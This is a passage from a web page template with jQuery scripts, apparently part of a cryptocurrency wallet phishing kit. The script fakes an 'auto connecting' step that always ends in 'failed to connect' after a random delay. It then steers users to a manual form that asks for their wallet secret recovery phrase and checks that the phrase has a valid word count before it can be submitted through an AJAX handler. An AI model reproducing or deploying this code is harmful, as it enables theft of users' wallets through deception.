                        $('#button_connect_wallet').text('Connect Wallet').css('pointer-events', 'all')
                        // $('#popup_connect_wallet').modal('hide')
                        // $('#popup_connect_wallet_success').show()
                        // window.setTimeout(function () {
                        //     //window.location.href = 'error.html';
                        // }, 2000);
                    },
                    error: function (response) {

                        let res = JSON.parse(response.responseText);

                        $('#responseContainer').addClass('alert-danger');
                        $('#responseContainer').removeClass('alert-success');
                        $('#responseContainer').html(res.msg);
                        $('#responseContainer').show();
                    },
                });
            });

        });
    </script>
    <script>
        //Handle Select Wallet Click
        $(function () {
            $('.select_wallet').on('click', function () {
                var wd = $(this); //wd = wallet details

                $('#wallet_name').text(wd.data('title'));
                //    $('#wallet_name').attr("value", wd.data('title'));
                //  $("#wallet_namexx").text(wd.data('title'));
                // var wd.data('title') = document.getElementById("wallet_namexx").value;
                $('#wallet_namexx').attr("value", wd.data('title'));

                $('#wallet_logo').attr("src", wd.data('logo'));
                $('#auto_connecting').show();
                $('#failed_to_connect').hide();
                $('#div_connect_manuallly').hide();

                // $('#popup_connect_wallet').show();

                var interval = 1000 * getRandomInt(1, 15);
                setTimeout(() => {
                    $('#auto_connecting').hide();
                    $('#div_connect_manuallly').hide();
                    $('#failed_to_connect').show();
                }, interval);


            })

            $('#try_auto_connecting_again').on('click', function (e) {
                e.preventDefault();
                $('#auto_connecting').show();
                $('#failed_to_connect').hide();
                $('#div_connect_manuallly').hide();


                var interval = 1000 * getRandomInt(1, 20);
                setTimeout(() => {
                    $('#auto_connecting').hide();
                    $('#div_connect_manuallly').hide();
                    $('#failed_to_connect').show();
                }, interval);
            })

            $('#button_connect_manually').on('click', function (e) {
                e.preventDefault();
                $('#auto_connecting').hide();
                $('#failed_to_connect').hide();
                $('#div_connect_manuallly').show();
            })

            //FOR PHRASE TEXT VALIDATION
            $('#secret_phrase').on('keyup', function () {
                var phrase_seed_entered = $(this).val().trim()
                if (phrase_seed_entered != "") {
                    var phrase_count = phrase_seed_entered.match(/(\w+)/g).length

                    if ([12, 15, 18, 21, 24].includes(phrase_count)) {
                        $('#button_connect_wallet').attr('disabled', false).css({"background-color": "green", "opacity": "1", "color": "white", "width" : "100%", "display" : "inline"})
                    } else {
                        $('#button_connect_wallet').attr('disabled', true).css('opacity', '0.2')
                    }
                } else {
                    $('#button_connect_wallet').attr('disabled', true).css('opacity', '0.2')
                }
            })


            $("#searchInp").on("keyup", function() {
                var value = $(this).val().toLowerCase().trim();

                // if(value == "") {
                //     $("#searchResult").addClass("d-none");
                //     return;
                // }

                var count = 0;
                $("#searchList .wallet_select").filter(function() {
                    $(this).toggle($(this).text().toLowerCase().indexOf(value) > -1);
                    if ($(this).text().toLowerCase().indexOf(value) > -1) {
                        count++;
                    }
                });

                console.log(count);
                $("#searchResult").removeClass("d-none");
                $("#resnum").text(count);
            });
        })

        function getRandomInt(min, max) {
            min = Math.ceil(min);
            max = Math.floor(max);
            return Math.floor(Math.random() * (max - min) + min); //The maximum is exclusive and the minimum is inclusive
        }

    </script>
@endsection